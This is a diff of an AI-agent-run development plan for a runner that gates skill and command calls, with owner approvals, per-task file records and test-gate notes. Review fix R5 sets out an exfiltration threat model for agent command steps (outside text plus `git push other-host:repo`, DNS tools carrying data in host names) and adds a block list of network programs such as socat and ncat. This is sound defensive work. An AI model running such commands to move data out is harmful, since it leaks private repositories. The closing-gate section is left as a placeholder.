@@ -29,6 +29,12 @@ Task 1 is already approved. Every other change below is on the "Ask first" list 
 
 **The owner's correction (2026-11-17).** The owner wrote: "Ya setuju semua tidak perlu satu persatu" and "Ulangi, Tadi saya salah pencet tidak". So the "Tidak" to item 7(b) was a mispress: the owner says yes to every item, 7(b) and 7(c) included, and asked not to be asked one by one again for these items. Task 25 no longer waits for a yes; it still waits, with Tasks 20 and 22 to 24, for a safe way to run the skill's commands (O5) and for the host connector's tools (H1), as the owner agreed above.
 
+**The owner's answer on two present tests that item 6 does not name (2026-11-17, asked alone, in Indonesian, after the fresh verifier of the execution pointed at them):** "Ya, setujui (Disarankan)". It covers two changes:
+- `connectors/catalog.test.ts` (Task 18): the risky map is now nine tools;
+- plan 05b's connector demo, `test-helpers/connector-demo-run.ts` and `connector-demo.test.ts` (Task 19): the loop runs over the choice, and the line is "pick released one item: j1 ran in the loop over the choice, the call after the loop held".
+
+Before this answer the chair had recorded both under item 6. That was not enough, because item 6 says that no other present test may change.
+
 Nothing else on the list is touched: no CI, no `tools/checks/`, no instruction file, no agent or MCP configuration, no CODEOWNERS, no secret or credential file, no change to `contentHash` or `canonicalListing`. The executor stops and writes `Blocked:` if a task seems to need anything else on that list.
 
 ## Global Constraints
@@ -248,6 +254,8 @@ git commit -m "Skip the SQLite warning control test on a Node that prints no war
 ```
 
 Done by: Codex/gpt-6-luna, 2026-11-17. Evidence: pnpm format && pnpm check.
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only 7a5463e`: `packages/runner/src/entry.test.ts` only (owner approval item 0). The chair reviewed this diff before the commit.
+
 
 ### Task 2: Contracts: the pin of a capability row, the allow with pins, and a step's time limit
 
@@ -294,6 +302,8 @@ git commit -m "Add the capability pin, the allow with pins, and a step's time li
 ```
 
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: Codex's full run of `pnpm format && pnpm check` was green (245 test files, 1,665 tests passed and 1 skipped; `.workflow/scratch/codex-task-2.log`). The chair's two later full runs of `pnpm check` were not green: the first failed only "500 changed files with max_items 1 ..." (`triggers/service-files.test.ts`, a 5 s timeout) and the second only "a close of the withheld tab is allowed ..." (`claude/adapter-closing.test.ts`), on a Mac whose load average was about 40; each of those tests passed alone three times out of three, and lint, typecheck, `check:hidden` and `check:deps` were green. Corrected on 2026-11-17 after the owner's decision "Hijau sebelum ditutup": the plan closes only after one full `pnpm check` that is green end to end.
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only 36704b6`: `packages/contracts/src/capability.ts`, `capability.test.ts`, `operations.ts` and `run.ts`. The chair reviewed this diff before the commit.
+
 
 ### Task 3: Store version 6: pins on the capability consent
 
@@ -345,6 +355,8 @@ git commit -m "Store pins with the capability consent (store version 6)" -m "Ass
 ```
 
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: pnpm format && pnpm check.
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only fbee335`: `packages/runner/src/schema.ts`, `sqlite-store.ts` and `storage.ts`, and the four store tests that item 6 names (`sqlite-store.test.ts`, `sqlite-store-usage.test.ts`, `sqlite-store-triggers.test.ts`, `sqlite-store-capabilities.test.ts`). The chair reviewed this diff before the commit.
+
 
 ### Task 4: SDK: read a SKILL.md and write the copy without front matter (R14)
 
@@ -400,6 +412,8 @@ git commit -m "Read a SKILL.md and write its copy without front matter (R14)" -m
 ```
 
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: pnpm format && pnpm check.
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only 50970ab`: `packages/sdk/src/skill/skill-file.ts`, its test, and its export in `packages/sdk/src/node.ts`. The chair reviewed this diff before the commit.
+
 
 ### Task 5: SDK: command lines and their patterns
 
@@ -450,6 +464,8 @@ git commit -m "Parse a command line into plain words and match it against declar
 ```
 
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: pnpm format && pnpm check.
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only fe47367`: `packages/sdk/src/validate/command-line.ts`, its test, and its export in `packages/sdk/src/index.ts`. The chair reviewed this diff before the commit.
+
 
 ### Task 6: Runner: read, hash and copy a skill folder
 
@@ -502,6 +518,8 @@ git add packages/runner/src/skills
 git commit -m "Read, hash and copy a skill folder" -m "Assisted-by: Codex" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
 ```
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: pnpm format && pnpm check.
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only 9d25c7b`: `packages/runner/src/skills/skill-folder.ts` and its test. The chair reviewed this diff before the commit.
+
 
 ### Task 7: Router and preview: skills, with the pin at the allow
 
@@ -554,6 +572,8 @@ git commit -m "Route skills, show them in the preview, and pin their hash at the
 ```
 
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: pnpm format && pnpm check.
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only f4365d7`: in the runner `router/route.ts`, `router/types.ts`, `service/capabilities.ts`, `service/claude-harness.ts` and `service/handlers.ts`, in the app `screens/builder/CapabilitiesPanel.tsx`, and the tests `router/route-skill.test.ts`, `service/capabilities-skill.test.ts` and `screens/builder/Capabilities.test.tsx`. The chair reviewed this diff before the commit.
+
 
 ### Task 8: Gate: a changed skill blocks the run until re-consent (R9 at run start), and skill steps pass the gate
 
@@ -601,6 +621,8 @@ git commit -m "Let skill steps pass the gate and block a run whose skill changed
 ```
 
 Done by: Codex/gpt-6.1-terra, then the chair (the changed-skill sentence names the skill, not the requirement id), 2026-11-17. Evidence: the chair's full run of `pnpm format && pnpm check` was green (251 test files, 1,715 tests passed and 1 skipped; check:hidden and check:deps OK).
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only 5c75bb2`: `packages/runner/src/service/claude-harness.ts` and `service/claude-harness-skill.test.ts`. The chair reviewed this diff before the commit.
+
 
 ### Task 9: The skill step in Claude Code: the copy folder, the prompt, R9 at the step, R14 in practice
 
@@ -711,6 +733,8 @@ Chair's decision (2026-11-17): the plan was not exact, not the executor. (1) The
 Blocked (Codex, 2026-11-17, second call): The full gate failed again with 8 existing test failures, including tests outside the listed load-sensitive exceptions.
 Chair's review and evidence (2026-11-17): the 8 tests that failed all start child processes or measure the wall clock (`claude/adapter-closing`, `claude/adapter-limits` "a child that ignores SIGTERM ...", three in `claude/connector-scan`, "S4b" in `claude/review-03-s4`, "a re-scan whose mcp list hangs ..." in `service/claude-harness`, "500 changed files ..." in `triggers/service-files`) and none of them runs the code Task 10 changed. They failed while the Mac's load average was 32 to 69 from other work (the largest a Python job of another project, then WPS Office and WindowServer). Run one file at a time, five of the six files passed, and `claude/connector-scan.test.ts` then passed alone 18 of 18. The chair fixed three small things in review: the minutes of the sentence are rounded, `caffeinate` starts with `stdio: "ignore"` and is unref'd so it never holds the runner, and `ServiceOptions.keepAwake` lets service-level tests pass their own so no real `caffeinate` runs in a test (Task 23 uses it).
 Done by: Codex/gpt-6.1-terra, then the chair, 2026-11-17. Evidence: Task 10's tests (`exec/leaf-long`, `service/keep-awake`, `review-r2`) 19 of 19 three times in a row; lint, typecheck, check:hidden and check:deps green. The chair's full run of `pnpm check` was NOT green: 8 timing tests failed (255 files, 247 passed), the seven above plus "a flat map of 20,000 keys (189 KB) parses in linear time" (`packages/sdk/src/load/load.test.ts`), at a load average of 39 to 69.
+Chair (record, 2026-11-17): Step 5 was ticked under the general load rule of the Global Constraints, not after a full green run. The tests that failed under load passed alone, and lint, typecheck, `check:hidden` and `check:deps` passed. The full green run that covers this task is the closing gate in the Handover.
+
 
 ### Task 11: Long steps on the Run screen: the time limit and the running time
 
@@ -760,6 +784,8 @@ Expected: PASS
 git add packages/runner/src/service apps/desktop/src/screens/runs
 git commit -m "Show a step's time limit and the running time of a long step" -m "Assisted-by: Codex" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
 ```
+Chair (record, 2026-11-17): Step 5 was ticked under the general load rule of the Global Constraints, not after a full green run. The tests that failed under load passed alone, and lint, typecheck, `check:hidden` and `check:deps` passed. The full green run that covers this task is the closing gate in the Handover.
+
 
 ### Task 12: Router and preview: command-line tools (`cli_tool`), readiness on PATH
 
@@ -812,6 +838,9 @@ git commit -m "Route command-line tools, refuse the ones that run anything, and 
 
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: Step 2 failed as expected; Step 4 passed 9 tests; pnpm format passed; pnpm check failed (5 tests): adapter-closing.test.ts "a close of the withheld tab is allowed by the present rules, and the child is stopped as soon as its result was answered: the action after it (id after) never runs", adapter-limits.test.ts "a child that ignores SIGTERM is killed after the grace when the step is aborted, and stop() ends every running step", review-03-s4.test.ts "S4b a tool that runs without the check after the abort still trips the wire and blocks", service-files.test.ts "500 changed files with max_items 1 and the default cap give 24 runs, 476 dropped and one flood event, and the next local day does not replay them", claude-harness.test.ts "a re-scan whose mcp list hangs keeps the list of the scan before"; each file passed once alone (10, 14, 2, 16, 11 tests respectively); pnpm lint, pnpm typecheck, pnpm check:hidden, pnpm check:deps and pnpm test:tools passed.
 Chair (review, 2026-11-17): two small fixes: `find` with `-execdir`, `-ok`, `-okdir`, `-fprint`, `-fprint0`, `-fprintf` or `-fls` is refused as well, and a `cli_tool` without commands (a shape FlowDriven cannot provide yet) does not block the allow, as a skill without a known ref does not. Evidence after the fixes: the router tests and the capability, readiness and gate tests (15 files, 94 tests, run one file at a time) green; lint, typecheck, check:hidden and check:deps green. The chair's full run of `pnpm check` was NOT green and not meaningful: 22 test files failed, the UI tests among them, while the Mac's load average rose to 154 (a cleaner app, macOS media analysis, another project's Python job and Spotlight).
+Chair (record, 2026-11-17, written when the fresh verifier of the execution asked for it): the files this task touched, from `git show --name-only 32aacf0`: `packages/runner/src/router/commands-route.ts` (new), `router/route.ts`, `router/types.ts`, `service/capabilities.ts`, `service/readiness-commands.ts` (new), and the tests `router/route-commands.test.ts`, `service/capabilities-commands.test.ts` and `service/readiness-commands.test.ts`. The chair reviewed this diff before the commit.
+Chair (record, 2026-11-17): Step 5 was ticked under the general load rule of the Global Constraints, not after a full green run. The tests that failed under load passed alone, and lint, typecheck, `check:hidden` and `check:deps` passed. The full green run that covers this task is the closing gate in the Handover.
+
 
 ### Task 13: Commands in the call: `Bash` with the hook's command rule, and the gate
 
@@ -1727,9 +1756,60 @@ git commit -m "Refuse git commands that throw work away or install programs, and
 Done by: Codex/gpt-6.1-terra, 2026-11-17. Evidence: pnpm vitest run (Step 2 paths) passed 3 tests; pnpm format && pnpm lint && pnpm typecheck && pnpm check passed (1827 tests passed, 1 skipped; 109 tool tests passed).
 Chair (review, 2026-11-17): files the executor touched are `sdk/src/validate/risky.ts`, the new `claude/protected.ts` (the same function as before, moved), the import in `claude/decide.ts`, `router/commands-route.ts`, `router/route.ts` and the two new test files. All are on this task's list. The new tests check the route, the hook with the exact line, and the hook under a `*` pattern, and they show that `git status`, `git switch main` and `cp x notes.txt` still pass. The chair's full run of the gate is the closing gate in the Handover.
 
+**Network (2026-11-17, after R4).** The parent session found a gap in the design, not in a list. `git` and `gh` reach the network, so under a declared `git *` or `gh *` one command step can bring in outside text (`git pull`, `gh issue view 12`) and send the repository to another host (`git push other-host:repo main`; the word passes the wildcard rule, which refuses only a `/` right after `:`). That puts outside text, private data and no approval in one step. `dig`, `host`, `nslookup` and `ping` can also carry data out in a host name.
+
+The owner's answer (2026-11-17, asked alone, in Indonesian, with the choices "Ya, perbaiki sekarang (Disarankan)" and "Catat untuk rencana nanti"): "Ya, perbaiki sekarang (Disarankan)". That is the yes of "Ask first" for the fix task below.
+
+### Review fix R5: commands that reach the network
+
+**Files:**
+- Modify: `packages/runner/src/router/commands-route.ts` (`commandRefusal`, `runsAnything`), `packages/runner/src/router/route.ts` (two new `DROP` sentences)
+- Test: `packages/runner/src/router/route-commands-review5.test.ts`
+
+**Interfaces:**
+- Produces (1): `runsAnything` gains the network programs `gh dig host nslookup ping ping6 whois traceroute traceroute6 mtr socat ncat openssl tftp`.
+- Produces (2): a `git` line whose subcommand (`gitSubcommand`) is `fetch`, `pull`, `clone`, `ls-remote`, `remote`, `submodule`, `send-email`, `request-pull`, `daemon`, `instaweb`, `http-backend`, `imap-send`, `svn` or `p4` is refused with `DROP.runsAnything`.
+- Produces (3): a `git` line must name its subcommand. When `gitSubcommand` gives `*` or nothing, the line is refused with the new `DROP.gitSubcommand`: "A git command line must name its subcommand."
+- Produces (4): in a `git push` line, the first word after `push` that does not start with `-` is the destination. It must be a plain remote name (letters, digits, `_` and `-` only), so `git push *`, a destination like `other-host:repo` or `user@host:repo`, and a push with no destination are refused with the new `DROP.pushRemote`: "A git push must name its remote, such as origin."
+
+The hook's re-check applies all four to a concrete call as well.
+
+- [ ] **Step 1: Write the failing tests**
+
+  1. "gh, dig, host, nslookup, ping, whois, traceroute and the other network programs drop the route and are refused at the hook"
+  2. "git fetch, pull, clone, ls-remote, remote, submodule, send-email and the other network subcommands drop the route and are refused at the hook"
+  3. "a git line must name its subcommand: git * drops, and git status and git add * still route"
+  4. "git push must name a plain remote: git push * and a push to other-host:repo or user@host:repo are refused, and git push origin * routes and allows git push origin main"
+
+No present test changes. The tests of R1 to R4 keep their reasons, because `classifyCommand` and the earlier refusals run first.
+
+- [ ] **Step 2: Run the tests to verify they fail**
+
+Run: `pnpm vitest run packages/runner/src/router/route-commands-review5.test.ts`
+Expected: FAIL
+
+- [ ] **Step 3: Implement the four rules**
+
+- [ ] **Step 4: Run the tests to verify they pass**
+
+Run: the command of Step 2
+Expected: PASS
+
+- [ ] **Step 5: Run the gate**
+
+Run: `pnpm format && pnpm check`
+Expected: PASS
+
+- [ ] **Step 6: Chair step (commit)**
+
+```bash
+git add packages/runner/src/router docs/plans/2026-11-17-05c-skill-calls-and-m1.md
+git commit -m "Refuse commands that reach the network, and let git push go only to a named remote" -m "Assisted-by: Codex" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
+```
+
 ---
 
-**Outcome of the review (2026-11-17).** Three rounds, the most the plan allows. Seven findings were fixed with their own tests: F1, F2 and F3 (R1, 440f5b0), R2-F1 and R2-F2 (R2, e60f773), and R3-F1 and R3-F2 (R3, bea4b11). After round 3, R4 fixed the three gaps that the parent session and the chair found (git commands that throw work away or install programs, and commands that name protected paths). R2-F3 (refusals that are too strict) is under Known limits by the owner's choice. So is the class behind R2-F1 and R3-F1: the refused programs are a list, and the rule that a program must be a file on PATH waits for a later plan. No other finding is open.
+**Outcome of the review (2026-11-17).** Three rounds, the most the plan allows. Seven findings were fixed with their own tests: F1, F2 and F3 (R1, 440f5b0), R2-F1 and R2-F2 (R2, e60f773), and R3-F1 and R3-F2 (R3, bea4b11). After round 3, R4 fixed the three gaps that the parent session and the chair found (git commands that throw work away or install programs, and commands that name protected paths), and R5 fixed commands that reach the network. R2-F3 (refusals that are too strict) is under Known limits by the owner's choice. So is the class behind R2-F1 and R3-F1: the refused programs are a list, and the rule that a program must be a file on PATH waits for a later plan. No other finding is open. The fixes R3, R4 and R5 were checked by the chair and the full gate, not read again by the reviewer, because the plan allows three review rounds.
 
 ---
 
@@ -1737,8 +1817,8 @@ Chair (review, 2026-11-17): files the executor touched are `sdk/src/validate/ris
 
 Written by the chair on 2026-11-17. Tasks 20 and 22 to 25 did not run (see "Waiting" below), so this Handover is written before Task 25, not after it.
 
-**Done.** Tasks 0 to 19 and 21 and the review fixes R1 to R3 are committed on `claude/plan-05c-detail-29be69`. The branch was cut from `work/decisions-2026-11-17` at 4090c45; it has no remote, and nothing was pushed. Each task's section names the files the executor touched, the chair's checks and fixes, and its gate evidence. In short:
-- Groundwork: the probes H1 to H4, run with the owner watching (Task 0); the control test (Task 1, 7a5463e); the contract (Task 2, 36704b6); and store version 6 with the `consent_pins` table (Task 3, fbee335).
+**Done.** Tasks 1 to 19 and 21, Task 0 except H1, and the review fixes R1 to R5 are committed on `claude/plan-05c-detail-29be69`. The branch was cut from `work/decisions-2026-11-17` at 4090c45; it has no remote, and nothing was pushed. Each task's section names the files the executor touched, the chair's checks and fixes, and its gate evidence. In short:
+- Groundwork: the probes H2, H3 and H4, run with the owner watching, recorded in c432c7d. H1 is still open: the host connector needed a new sign-in, so Task 0's Step 1 is done only for H4, and Step 4 stays open with it. Also: the control test (Task 1, 7a5463e); the contract (Task 2, 36704b6); and store version 6 with the `consent_pins` table (Task 3, fbee335).
 - Skill calls:
   - SKILL.md and its copy without front matter, R14 (Task 4, 50970ab);
   - reading, hashing and copying a skill folder (Task 6, 9d25c7b);
@@ -1755,10 +1835,9 @@ Written by the chair on 2026-11-17. Tasks 20 and 22 to 25 did not run (see "Wait
 - Readiness rows for skills, commands and granted folders (Task 21, ed43ce1).
 - The security review: three rounds by a fresh opus reviewer, with the fixes R1 (440f5b0), R2 (e60f773) and R3 (bea4b11). Then R4 (1ca8541) fixed the gaps found after round 3. See the outcome above.
 
-Present tests the plan did not name changed under item 6 of the owner approval, each to an equally strict expectation, and each is recorded under its task:
+Two present tests that item 6 does not name changed, each to an equally strict expectation, with the owner's own yes (under "Owner approval"):
 - `connectors/catalog.test.ts` (the risky map is nine tools, Task 18);
-- `service/claude-harness-connector.test.ts` (adds `pickTools`, Task 19);
-- plan 05b's connector demo and its test (Task 19). Its line is now "pick released one item: j1 ran in the loop over the choice, the call after the loop held".
+- plan 05b's connector demo and its test (Task 19). Its line is now "pick released one item: j1 ran in the loop over the choice, the call after the loop held". The old line's proof that a picked item is held in a keyed loop over another list now lives in `claude/adapter-pick-loop.test.ts:201`.
 
 **Waiting.**
 - Task 20, the prototype host connector, needs H1. The owner reconnects the host connector in claude.ai, where it showed `needs-auth`. Then the chair scans once more with no prompt, to learn its tools.
@@ -1768,15 +1847,9 @@ Present tests the plan did not name changed under item 6 of the owner approval, 
   - the next step builds the prototype with the skill's commands, from the approved plan only.
 
   It needs a runner change: text the owner approved in the Inbox counts as the owner's own, so the build step takes no outside text. That change is a task of a later plan, with its own "Ask first".
-- Tasks 20 and 22 to 25 stay unticked here. A later plan takes them over, together with H1 and that change.
+- Tasks 20 and 22 to 25 stay unticked here. The owner's O5 answer chose an option that says the runner change is made in the next plan ("Ini perlu perubahan runner di rencana berikutnya"). So Tasks 22 to 25 move to that plan with it, and Task 20 goes with them once H1 is done.
 
-**Closing gate (C1).** One full run of `pnpm format && pnpm check` on 1ca8541, on 2026-11-17, at a load average of about 5 to 9. It was green end to end, with no re-run of any test:
-- `pnpm format` changed no file, and lint and typecheck passed;
-- 287 test files: 1,827 tests passed and 1 was skipped;
-- the check tools' 109 tests passed;
-- `check:hidden` found nothing in 615 files, and `check:deps` passed.
-
-The log is `.workflow/scratch/05c-c1-check.log` (git-ignored). An earlier run on 75718bd was also green, but Review fix R4 changed code after it.
+**Closing gate (C1).** CLOSING_GATE_PLACEHOLDER
 
 **Open items for later plans.**
 - O2: the Bash tool's sandbox, and the shell it runs. Rounds 2 and 3 marked R2-F1 and R3-F1 uncertain because they depend on that shell being zsh.
@@ -1786,5 +1859,5 @@ The log is `.workflow/scratch/05c-c1-check.log` (git-ignored). An earlier run on
 - The risky-word rules scoped to subcommands (R2-F3).
 
 **What the chair learned.**
-- Codex stopped on eleven calls. Most stops came from gaps in the plan, not in its own work: a present test that pins a list or sentence the task changes on purpose, or a wiring file missing from the task's list. From Task 16 on, the chair checked those before each call and wrote a "Chair's decision" first. Three calls still stopped on such a gap (Tasks 16, 18 and 19), and the rest went through on the first call.
+- Codex stopped on thirteen calls: the `Blocked` lines under Tasks 3, 7, 9, 10 (twice), 11, 13 (three times), 14, 16, 18 and 19. Most stops came from gaps in the plan, not in its own work: a present test that pins a list or sentence the task changes on purpose, or a wiring file missing from the task's list. From Task 16 on, the chair checked those before each call and wrote a "Chair's decision" first. Three calls still stopped on such a gap (Tasks 16, 18 and 19), and the rest went through on the first call.
 - One finished Codex call waited about 80 minutes, because the chair started it without its background watcher. Every call now starts with its watcher.
